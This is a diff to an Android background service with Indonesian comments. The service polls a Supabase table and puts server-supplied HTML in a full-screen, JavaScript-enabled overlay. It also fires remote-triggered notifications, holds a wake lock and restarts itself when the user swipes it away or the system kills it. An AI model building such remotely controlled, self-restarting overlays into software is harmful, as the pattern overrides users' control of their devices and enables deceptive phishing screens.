@@ -32,16 +32,21 @@ public class LayananBackground extends Service {
     private WindowManager windowManager;
     private WebView webViewOverlay;
     private Handler handler = new Handler(Looper.getMainLooper());
-    private String htmlTerakhir = "";
+    
+    private String htmlOverlayTerakhir = "";
+    private String dataNotifTerakhir = ""; // Untuk melacak notif baru
+    
     private PowerManager.WakeLock wakeLock; 
     
-    private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.2&select=html_content";
+    // PERUBAHAN: Sekarang kita mengambil data untuk ID 2 (Overlay) dan ID 3 (Notifikasi) sekaligus
+    private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=in.(2,3)&select=id,html_content";
     private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 
 
     @Override
     public void onCreate() {
         super.onCreate();
         aktifkanModeAntiMati();
+        buatChannelNotifikasiBunyi(); // Siapkan saluran untuk notif berbunyi
         siapkanOverlayWeb();
         mulaiPengecekanOtomatis();
     }
@@ -63,8 +68,6 @@ public class LayananBackground extends Service {
                     .setSmallIcon(android.R.drawable.ic_dialog_info) 
                     .build();
             
-            // --- PERBAIKAN KRITIS UNTUK ANDROID 16 ---
-            // Menyebutkan secara eksplisit tipe FOREGROUND_SERVICE_TYPE_DATA_SYNC
             if (Build.VERSION.SDK_INT >= 29) { 
                 startForeground(1, notifikasi, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
             } else {
@@ -79,9 +82,24 @@ public class LayananBackground extends Service {
         }
     }
 
+    // FUNGSI BARU: Membuat Saluran (Channel) khusus agar notifikasi bisa muncul di atas layar dan berbunyi
+    private void buatChannelNotifikasiBunyi() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    "ChannelPemberitahuan",
+                    "Pemberitahuan Penting",
+                    NotificationManager.IMPORTANCE_HIGH // IMPORTANCE_HIGH membuat notif melayang (Heads-up) dan berbunyi
+            );
+            channel.enableVibration(true);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+    }
+
     private void siapkanOverlayWeb() {
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        
         webViewOverlay = new WebView(this);
         WebSettings webSettings = webViewOverlay.getSettings();
         webSettings.setJavaScriptEnabled(true);
@@ -91,12 +109,8 @@ public class LayananBackground extends Service {
         webViewOverlay.setBackgroundColor(0x00000000); 
         webViewOverlay.setVisibility(View.GONE);
 
-        int jenisOverlay;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            jenisOverlay = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
-        } else {
-            jenisOverlay = WindowManager.LayoutParams.TYPE_PHONE;
-        }
+        int jenisOverlay = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;
 
         WindowManager.LayoutParams parameter = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -106,7 +120,6 @@ public class LayananBackground extends Service {
                 PixelFormat.TRANSLUCENT
         );
         parameter.gravity = Gravity.CENTER;
-
         windowManager.addView(webViewOverlay, parameter);
     }
 
@@ -133,12 +146,8 @@ public class LayananBackground extends Service {
                     koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                     koneksi.setRequestProperty("Accept", "application/json");
                     
-                    // --- PERBAIKAN ANTI-CACHE OVERLAY ---
                     koneksi.setUseCaches(false);
                     koneksi.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate");
-                    koneksi.setRequestProperty("Pragma", "no-cache");
-                    koneksi.setRequestProperty("Expires", "0");
-                    // ------------------------------------
 
                     if (koneksi.getResponseCode() == 200) {
                         BufferedReader in = new BufferedReader(new InputStreamReader(koneksi.getInputStream()));
@@ -149,24 +158,47 @@ public class LayananBackground extends Service {
                         }
                         in.close();
 
-                        JSONArray dataJson = new JSONArray(response.toString());
-                        if (dataJson.length() > 0) {
-                            JSONObject barisData = dataJson.getJSONObject(0);
-                            final String htmlBaru = barisData.getString("html_content");
+                        JSONArray dataJsonArray = new JSONArray(response.toString());
+                        
+                        // Memproses banyak data sekaligus (ID 2 untuk Overlay, ID 3 untuk Notif)
+                        for (int i = 0; i < dataJsonArray.length(); i++) {
+                            JSONObject barisData = dataJsonArray.getJSONObject(i);
+                            int id = barisData.getInt("id");
+                            final String konten = barisData.getString("html_content");
 
-                            if (!htmlBaru.equals(htmlTerakhir)) {
-                                htmlTerakhir = htmlBaru;
-                                handler.post(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        if (htmlBaru.equals("STOP_OVERLAY") || htmlBaru.trim().isEmpty()) {
-                                            webViewOverlay.setVisibility(View.GONE);
-                                        } else {
-                                            webViewOverlay.setVisibility(View.VISIBLE);
-                                            webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
+                            // PROSES ID 2: OVERLAY LAYAR
+                            if (id == 2) {
+                                if (!konten.equals(htmlOverlayTerakhir)) {
+                                    htmlOverlayTerakhir = konten;
+                                    handler.post(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            if (konten.equals("STOP_OVERLAY") || konten.trim().isEmpty()) {
+                                                webViewOverlay.setVisibility(View.GONE);
+                                            } else {
+                                                webViewOverlay.setVisibility(View.VISIBLE);
+                                                webViewOverlay.loadDataWithBaseURL(null, konten, "text/html", "UTF-8", null);
+                                            }
                                         }
+                                    });
+                                }
+                            }
+                            
+                            // PROSES ID 3: NOTIFIKASI PUSH
+                            if (id == 3) {
+                                if (!konten.equals(dataNotifTerakhir) && !konten.trim().isEmpty()) {
+                                    dataNotifTerakhir = konten;
+                                    
+                                    // Ekstrak Judul dan Pesan dari format JSON
+                                    try {
+                                        JSONObject notifJson = new JSONObject(konten);
+                                        String judulNotif = notifJson.getString("judul");
+                                        String pesanNotif = notifJson.getString("pesan");
+                                        tampilkanNotifikasiKeLayar(judulNotif, pesanNotif);
+                                    } catch (Exception e) {
+                                        e.printStackTrace(); // Abaikan jika format salah
                                     }
-                                });
+                                }
                             }
                         }
                     }
@@ -178,12 +210,34 @@ public class LayananBackground extends Service {
         }).start();
     }
 
+    // FUNGSI BARU: Menampilkan notifikasi melayang dan berbunyi
+    private void tampilkanNotifikasiKeLayar(String judul, String pesan) {
+        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        if (manager == null) return;
+
+        Notification.Builder builder;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder = new Notification.Builder(this, "ChannelPemberitahuan");
+        } else {
+            builder = new Notification.Builder(this)
+                .setPriority(Notification.PRIORITY_HIGH)
+                .setDefaults(Notification.DEFAULT_ALL); // Mengaktifkan suara dan getar untuk Android lama
+        }
+
+        builder.setContentTitle(judul)
+               .setContentText(pesan)
+               .setSmallIcon(android.R.drawable.ic_dialog_email) // Ikon surat
+               .setAutoCancel(true);
+
+        // ID notifikasi kita buat acak (misal 1001) agar tidak menimpa notifikasi Anti-Kill (ID 1)
+        manager.notify(1001, builder.build());
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         return START_STICKY; 
     }
 
-    // FITUR AUTORUN 1: Deteksi saat aplikasi digeser (swipe) dari Recent Apps
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
@@ -192,7 +246,6 @@ public class LayananBackground extends Service {
         super.onTaskRemoved(rootIntent);
     }
 
-    // FITUR AUTORUN 2: Deteksi saat sistem mencoba menghancurkan layanan
     @Override
     public void onDestroy() {
         super.onDestroy();
@@ -203,8 +256,6 @@ public class LayananBackground extends Service {
         if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
         }
-
-        // Berteriak mengirim sinyal sebelum benar-benar mati
         Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
         restartServiceIntent.setPackage(getPackageName());
         sendBroadcast(restartServiceIntent);
